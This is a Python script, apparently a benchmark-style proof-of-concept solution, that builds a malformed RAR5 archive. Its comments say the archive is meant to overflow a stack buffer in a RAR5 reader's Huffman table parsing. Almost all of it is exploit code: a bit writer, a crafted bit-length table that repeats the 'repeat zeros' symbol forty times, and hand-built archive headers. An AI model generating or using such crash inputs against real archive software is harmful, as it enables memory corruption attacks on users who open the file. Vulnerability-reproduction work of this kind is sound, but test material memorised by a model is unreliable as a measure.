import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature
        SIG = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        def crc32(data):
            return struct.pack("<I", binascii.crc32(data) & 0xFFFFFFFF)

        def vint(n):
            out = bytearray()
            while n >= 0x80:
                out.append((n & 0x7F) | 0x80)
                n >>= 7
            out.append(n)
            return bytes(out)

        # BitWriter to generate the malicious payload
        class BitWriter:
            def __init__(self):
                self.buf = bytearray()
                self.accum = 0
                self.n = 0
            
            def write(self, val, bits):
                for i in range(bits):
                    if (val >> i) & 1:
                        self.accum |= (1 << self.n)
                    self.n += 1
                    if self.n == 8:
                        self.buf.append(self.accum)
                        self.accum = 0
                        self.n = 0
            
            def flush(self):
                if self.n > 0:
                    self.buf.append(self.accum)
                    self.accum = 0
                    self.n = 0
            
            def get(self):
                return bytes(self.buf)

        # Generate Payload
        # The vulnerability exists in the RAR5 reader when parsing Huffman tables.
        # Specifically, RLE expansion in the Main Table can overflow a stack buffer.
        bw = BitWriter()
        
        # Block Header: Tables Present = 1
        bw.write(1, 1)

        # Bit Length Table (20 nibbles)
        # We construct a table where Symbol 17 has len 1 and Symbol 18 has len 1.
        # This creates a canonical Huffman tree where codes are 0 and 1.
        # 0..16: length 0
        for _ in range(17):
            bw.write(0, 4)
        bw.write(1, 4) # Index 17 (Code 0)
        bw.write(1, 4) # Index 18 (Code 1)
        bw.write(0, 4) # Index 19

        # Main Table Stream
        # We spam Symbol 18 (Code 1) which triggers "Repeat Zeros".
        # Each repeat writes (val + 11) zeros. Max val 127 -> 138 zeros.
        # The destination buffer is typically around 300-500 bytes.
        # Spamming this entry overflows the buffer.
        for _ in range(40):
            bw.write(1, 1)      # Code 1 (Symbol 18)
            bw.write(127, 7)    # Repeat Count (Max)
        
        bw.flush()
        payload = bw.get()

        # Generate Main Archive Header
        # Type: 1, Flags: 0, Extra: 0
        mh_data = vint(1) + vint(0) + vint(0)
        mh = crc32(mh_data) + vint(len(mh_data)) + mh_data

        # Generate File Header
        # Name: "p"
        name = b"p"
        # Compression Info: Method 1 (Fastest) to enable Huffman, Dict 0 (128KB) -> 0x01
        comp_info = vint(1)
        
        # File Header Body
        # Flags(0), UnpSize(1000), Attr(0), CompInfo, HostOS(0), NameLen, Name
        fh_body = (
            vint(0) + 
            vint(1000) + 
            vint(0) + 
            comp_info + 
            vint(0) + 
            vint(len(name)) + 
            name
        )
        
        # Header Content: Type(2), Flags(0), Extra(0), DataSize, Body
        fh_content = (
            vint(2) + 
            vint(0) + 
            vint(0) + 
            vint(len(payload)) + 
            fh_body
        )
        
        fh = crc32(fh_content) + vint(len(fh_content)) + fh_content

        return SIG + mh + fh + payload